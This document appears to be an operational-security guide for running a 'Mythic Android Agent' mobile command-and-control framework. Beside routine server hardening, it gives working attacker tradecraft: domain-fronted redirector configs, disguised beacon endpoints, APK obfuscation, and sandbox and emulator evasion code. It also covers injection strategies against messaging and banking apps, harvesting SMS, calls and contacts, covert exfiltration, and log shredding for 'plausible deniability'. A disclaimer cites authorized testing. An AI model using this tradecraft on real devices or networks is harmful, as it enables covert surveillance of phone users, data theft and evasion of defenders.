# OPSEC Considerations and Best Practices

## Table of Contents

1. [Overview](#overview)
2. [Infrastructure Security](#infrastructure-security)
3. [Network OPSEC](#network-opsec)
4. [Payload Generation](#payload-generation)
5. [C2 Communication](#c2-communication)
6. [Data Handling](#data-handling)
7. [Operational Practices](#operational-practices)
8. [Detection Evasion](#detection-evasion)
9. [Incident Response](#incident-response)
10. [Legal Considerations](#legal-considerations)

## Overview

This guide provides operational security (OPSEC) considerations and best practices for deploying and operating the Mythic Android Agent framework. Following these guidelines helps maintain operational security, avoid detection, and ensure successful mission completion.

## Infrastructure Security

### Server Hardening

#### Operating System Security
```bash
# Keep system updated
sudo apt update && sudo apt upgrade -y

# Configure automatic security updates
echo 'Unattended-Upgrade::Automatic-Reboot "false";' >> /etc/apt/apt.conf.d/50unattended-upgrades
sudo systemctl enable unattended-upgrades

# Disable unnecessary services
sudo systemctl disable apache2 nginx (if not needed)
sudo systemctl disable bluetooth
sudo systemctl disable avahi-daemon

# Configure fail2ban
sudo apt install fail2ban
sudo systemctl enable fail2ban
```

#### SSH Configuration
```bash
# /etc/ssh/sshd_config
Port 22022                    # Change default port
PermitRootLogin no           # Disable root login
PasswordAuthentication no    # Use key-based auth only
MaxAuthTries 3              # Limit auth attempts
ClientAliveInterval 300     # Disconnect idle sessions
ClientAliveCountMax 2
```

#### Firewall Configuration
```bash
# UFW rules - be restrictive
sudo ufw default deny incoming
sudo ufw default allow outgoing
sudo ufw allow 22022/tcp     # SSH (custom port)
sudo ufw allow 80/tcp        # HTTP (if needed)
sudo ufw allow 443/tcp       # HTTPS
sudo ufw enable

# IP tables for advanced filtering
iptables -A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT
iptables -A INPUT -i lo -j ACCEPT
iptables -A INPUT -p tcp --dport 22022 -j ACCEPT
iptables -A INPUT -j DROP
```

### Hosting Considerations

#### Domain Selection
- **Avoid** suspicious or random domains
- **Use** legitimate-appearing domain names
- **Consider** domain fronting with major CDNs
- **Implement** domain generation algorithms (DGA) for backup domains
- **Purchase** domains with privacy protection enabled

#### Infrastructure Distribution
```yaml
# Recommended architecture
production:
  c2_servers:
    primary: "AWS/Azure/GCP"
    backup: "Different cloud provider"
    redirectors: "VPS providers (DigitalOcean, Linode)"
    
  domains:
    primary: "legitimate-sounding.com"
    backup: ["backup1.net", "backup2.org"]
    cdn_fronted: "cdn.cloudflare.com"
```

#### VPS/Cloud Security
- **Enable** full disk encryption
- **Use** different providers for different components
- **Implement** infrastructure as code (Terraform)
- **Monitor** for takedown attempts
- **Maintain** rapid deployment capabilities

## Network OPSEC

### Traffic Analysis Evasion

#### DNS Security
```bash
# Use DNS over HTTPS or DNS over TLS
# /etc/systemd/resolved.conf
[Resolve]
DNS=1.1.1.1#cloudflare-dns.com
DNS=8.8.8.8#dns.google
FallbackDNS=9.9.9.9#dns.quad9.net
DNSSEC=yes
DNSOverTLS=yes
```

#### VPN/Proxy Configuration
```bash
# OpenVPN client configuration
dev tun
proto udp
remote vpn.provider.com 1194
cipher AES-256-CBC
auth SHA256
verb 0                    # Reduce logging
log-append /dev/null      # Disable logs
```

#### Network Segmentation
- **Isolate** C2 infrastructure from other networks
- **Use** separate networks for different campaigns
- **Implement** network access control lists (NACLs)
- **Monitor** all network traffic

### C2 Traffic Obfuscation

#### HTTPS Beacon Best Practices
```yaml
https_beacon:
  # Use legitimate user agents
  user_agents:
    - "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36"
    - "Mozilla/5.0 (Linux; Android 14; Pixel 7) AppleWebKit/537.36"
  
  # Vary request timing
  beacon_interval: 300      # 5 minutes base
  jitter_percent: 30        # ±30% variation
  
  # Use legitimate-looking URLs
  endpoints:
    checkin: "/api/v2/analytics/events"
    tasks: "/api/v2/user/preferences"
    upload: "/api/v2/content/upload"
```

#### Domain Fronting Implementation
```nginx
# Nginx redirector configuration
server {
    listen 443 ssl http2;
    server_name legitimate-frontend.com;
    
    location / {
        proxy_pass https://real-c2-server.herokuapp.com;
        proxy_set_header Host real-c2-server.herokuapp.com;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_ssl_server_name on;
    }
}
```

## Payload Generation

### APK Signing and Certificates

#### Certificate Generation
```bash
# Generate signing certificate
keytool -genkey -v -keystore android.keystore -alias android_key \
    -keyalg RSA -keysize 4096 -validity 10000 \
    -dname "CN=Android Developer, OU=Mobile Team, O=Tech Corp, L=San Francisco, ST=CA, C=US"

# Sign APK
jarsigner -verbose -sigalg SHA256withRSA -digestalg SHA256 \
    -keystore android.keystore app.apk android_key

# Zipalign
zipalign -v 4 app.apk app-aligned.apk
```

#### Payload Obfuscation
```yaml
obfuscation:
  # String obfuscation
  encrypt_strings: true
  string_encryption_key: "random_key_per_build"
  
  # Control flow obfuscation
  add_dummy_methods: true
  method_renaming: true
  class_renaming: true
  
  # Anti-analysis
  add_anti_debug: true
  add_emulator_detection: true
  add_tamper_detection: true
```

### Target Application Selection

#### High-Value Targets
1. **Social Media Apps**: WhatsApp, Telegram, Signal
2. **Banking Apps**: Mobile banking applications
3. **Email Clients**: Gmail, Outlook, native email
4. **Productivity Apps**: Office suites, note-taking apps
5. **System Apps**: Settings, file managers, launchers

#### Injection Strategies by App Type
```yaml
social_media:
  injection_method: "activity_hijacking"
  persistence: "service_restart"
  stealth_level: "maximum"
  
banking:
  injection_method: "manifest_merge"
  anti_detection: ["ssl_pinning_bypass", "root_hiding"]
  stealth_level: "maximum"
  
system_apps:
  injection_method: "native_library"
  privileges: ["system_level", "device_admin"]
  persistence: "boot_receiver"
```

## C2 Communication

### Profile Selection Strategy

#### Primary C2: HTTPS Beacon
- **Use for**: Regular command and control
- **Benefits**: Appears as normal web traffic
- **OPSEC**: Implement domain fronting, vary user agents
- **Backup**: Automatically fail to secondary profiles

#### Secondary C2: FCM Push
- **Use for**: Urgent commands, wake-up signals
- **Benefits**: Uses Google's infrastructure
- **OPSEC**: Requires legitimate Firebase project
- **Limitations**: Requires Google Play Services

#### Tertiary C2: DNS Covert Channel
- **Use for**: Emergency communications, data exfiltration
- **Benefits**: Works through most firewalls
- **OPSEC**: Use legitimate domains, vary query patterns
- **Considerations**: Slower than other methods

### Communication Scheduling

#### Beacon Timing Strategy
```python
# Adaptive beacon intervals
base_interval = 300  # 5 minutes
intervals = {
    'high_activity': base_interval,      # Normal operations
    'low_activity': base_interval * 2,   # Quiet periods
    'stealth_mode': base_interval * 4,   # High-risk periods
    'emergency': 30                      # Emergency communications
}

# Time-based variations
def calculate_beacon_time():
    now = datetime.now()
    
    # Reduce activity during business hours
    if 9 <= now.hour <= 17:
        return intervals['low_activity']
    
    # Normal activity during evening/night
    elif 18 <= now.hour <= 23:
        return intervals['high_activity']
    
    # Stealth mode during late night/early morning
    else:
        return intervals['stealth_mode']
```

#### Geographic Considerations
- **Match** beacon times to target timezone
- **Avoid** patterns that suggest automated behavior
- **Consider** local internet usage patterns
- **Adapt** to regional network characteristics

## Data Handling

### Data Collection Policies

#### Minimal Collection Principle
```yaml
data_collection:
  # Only collect necessary data
  call_logs: true
  sms_messages: true
  contacts: true
  location: false        # Only if required
  camera_images: false   # High risk, low reward
  microphone: false      # Very high risk
```

#### Data Classification
- **Critical**: Credentials, authentication tokens
- **Sensitive**: Personal communications, location data
- **Operational**: System information, installed apps
- **Metadata**: Connection logs, beacon data

### Secure Data Transmission

#### Encryption Standards
```python
# End-to-end encryption
def encrypt_data(data, campaign_key):
    # Use AES-256-GCM for data encryption
    cipher = AES.new(campaign_key, AES.MODE_GCM)
    ciphertext, auth_tag = cipher.encrypt_and_digest(data)
    
    return {
        'ciphertext': base64.b64encode(ciphertext).decode(),
        'nonce': base64.b64encode(cipher.nonce).decode(),
        'auth_tag': base64.b64encode(auth_tag).decode()
    }
```

#### Data Exfiltration Techniques
1. **Chunked Transfer**: Break large files into small chunks
2. **Steganography**: Hide data in legitimate file formats
3. **Time Delay**: Spread exfiltration over extended periods
4. **Multiple Channels**: Use different C2 profiles for different data types

### Data Storage Security

#### Server-Side Protection
```bash
# Encrypt data at rest
cryptsetup luksFormat /dev/sdb1
cryptsetup luksOpen /dev/sdb1 encrypted_storage
mkfs.ext4 /dev/mapper/encrypted_storage

# Mount with secure options
mount -o noatime,nodev,nosuid /dev/mapper/encrypted_storage /encrypted
```

#### Data Retention Policies
- **Automatically** delete data after campaign completion
- **Implement** secure deletion techniques
- **Maintain** only necessary operational data
- **Regular** data purging schedules

## Operational Practices

### Campaign Management

#### Campaign Isolation
```yaml
# Separate campaigns completely
campaigns:
  corporate_assessment:
    infrastructure: "aws-us-east-1"
    domains: ["corporate-cdn.com"]
    encryption_keys: "unique_per_campaign"
    
  mobile_testing:
    infrastructure: "azure-eu-west-1"
    domains: ["mobile-analytics.net"]
    encryption_keys: "separate_key_set"
```

#### Operational Security Procedures
1. **Use** dedicated machines for operations
2. **Maintain** separate identities/personas per campaign
3. **Implement** operational timelines and deadlines
4. **Document** all activities (securely)
5. **Regular** security reviews and updates

### Team Coordination

#### Access Control
```yaml
team_access:
  operators:
    permissions: ["campaign_management", "agent_control"]
    mfa_required: true
    session_timeout: 4_hours
    
  analysts:
    permissions: ["data_analysis", "reporting"]
    mfa_required: true
    read_only: true
    
  administrators:
    permissions: ["system_admin", "infrastructure"]
    mfa_required: true
    approval_required: true
```

#### Communication Security
- **Use** encrypted communication channels
- **Implement** code words for sensitive operations
- **Maintain** communication logs (encrypted)
- **Regular** security briefings and updates

## Detection Evasion

### Anti-Virus Evasion

#### Behavioral Analysis Evasion
```java
// Delay execution to avoid sandbox detection
public void executeWithDelay() {
    try {
        // Random delay between 30-180 seconds
        Thread.sleep((30 + new Random().nextInt(150)) * 1000);
        
        // Check if running in emulator
        if (!isEmulator()) {
            initializeAgent();
        }
    } catch (InterruptedException e) {
        // Handle interruption
    }
}

// Emulator detection
private boolean isEmulator() {
    return Build.FINGERPRINT.contains("generic")
        || Build.MODEL.contains("Emulator")
        || Build.MANUFACTURER.contains("Genymotion");
}
```

#### Static Analysis Evasion
- **Obfuscate** method and class names
- **Encrypt** sensitive strings and configurations
- **Use** reflection to hide API calls
- **Implement** control flow obfuscation
- **Add** legitimate functionality to reduce suspicion

### Network Detection Evasion

#### Traffic Pattern Randomization
```python
def randomize_beacon():
    # Vary request size
    payload_size = random.randint(100, 1000)
    padding = os.urandom(payload_size)
    
    # Vary timing
    jitter = random.uniform(0.7, 1.3)
    next_beacon = base_interval * jitter
    
    # Vary endpoints
    endpoint = random.choice(['/api/events', '/api/metrics', '/api/logs'])
    
    return {
        'payload': actual_data + padding,
        'delay': next_beacon,
        'endpoint': endpoint
    }
```

#### Domain Rotation Strategy
```python
class DomainRotation:
    def __init__(self):
        self.primary_domains = ['cdn1.example.com', 'api.example.com']
        self.backup_domains = ['backup1.net', 'backup2.org']
        self.current_domain_index = 0
        self.failure_count = 0
    
    def get_current_domain(self):
        # Switch domains after failures
        if self.failure_count >= 3:
            self.rotate_domain()
            self.failure_count = 0
            
        return self.primary_domains[self.current_domain_index]
    
    def report_failure(self):
        self.failure_count += 1
```

## Incident Response

### Compromise Detection

#### Warning Signs
1. **Unexpected** agent disconnections
2. **Unusual** network traffic patterns
3. **Increased** security tool activity
4. **Legal** or compliance inquiries
5. **Media** attention or public disclosure

#### Response Procedures
```bash
#!/bin/bash
# Emergency shutdown procedure

# 1. Immediately stop all C2 communications
docker-compose stop mythic-android

# 2. Backup critical data
tar -czf emergency_backup_$(date +%s).tar.gz data/ logs/

# 3. Wipe temporary files
find /tmp -name "*mythic*" -delete
shred -vfz -n 3 /var/log/mythic*

# 4. Shutdown infrastructure
terraform destroy -auto-approve

# 5. Notify team through secure channel
echo "COMPROMISE DETECTED - INFRASTRUCTURE SHUTDOWN" | \
    gpg --encrypt --recipient team@secure.com | \
    mail -s "URGENT" emergency@secure.com
```

### Data Protection During Incidents

#### Data Destruction
```python
def secure_delete_data(file_path):
    """Securely delete sensitive data"""
    if os.path.exists(file_path):
        # Overwrite with random data multiple times
        file_size = os.path.getsize(file_path)
        
        with open(file_path, 'r+b') as file:
            for _ in range(3):  # 3-pass overwrite
                file.seek(0)
                file.write(os.urandom(file_size))
                file.flush()
                os.fsync(file.fileno())
        
        # Remove file
        os.remove(file_path)
```

#### Evidence Minimization
- **Minimize** log retention
- **Use** ephemeral infrastructure
- **Implement** automatic data destruction
- **Maintain** plausible deniability

## Legal Considerations

### Authorization Requirements

#### Documentation Requirements
```yaml
legal_documentation:
  authorization:
    - signed_penetration_testing_agreement
    - scope_of_work_document
    - rules_of_engagement
    - incident_response_procedures
    
  compliance:
    - data_protection_assessment
    - privacy_impact_assessment
    - regulatory_compliance_review
    - legal_jurisdiction_analysis
```

#### Scope Limitations
- **Clearly define** authorized targets
- **Document** approved activities
- **Establish** communication protocols
- **Define** data handling procedures

### Regulatory Compliance

#### Data Protection Requirements
- **GDPR** compliance for EU targets
- **CCPA** compliance for California targets
- **Industry-specific** regulations (HIPAA, PCI-DSS)
- **Export control** regulations (EAR, ITAR)

#### Reporting Requirements
```yaml
reporting:
  incident_reporting:
    timeframe: "within 72 hours"
    recipients: ["legal_team", "compliance_officer", "client"]
    
  data_breach_notification:
    timeframe: "within 24 hours of discovery"
    authorities: ["data_protection_authority", "law_enforcement"]
    
  regular_reports:
    frequency: "weekly"
    content: ["activities_summary", "findings", "recommendations"]
```

## Conclusion

Following these OPSEC guidelines significantly reduces the risk of detection and compromise. However, operational security is an ongoing process that requires:

1. **Continuous** monitoring and assessment
2. **Regular** updates to procedures and techniques
3. **Team** training and awareness
4. **Adaptation** to new threats and countermeasures
5. **Legal** compliance and ethical considerations

Remember: The goal is successful mission completion while maintaining the highest level of operational security and legal compliance.

---

**Disclaimer**: This guide is for educational and authorized security testing purposes only. Users are responsible for ensuring compliance with all applicable laws and regulations in their jurisdiction.
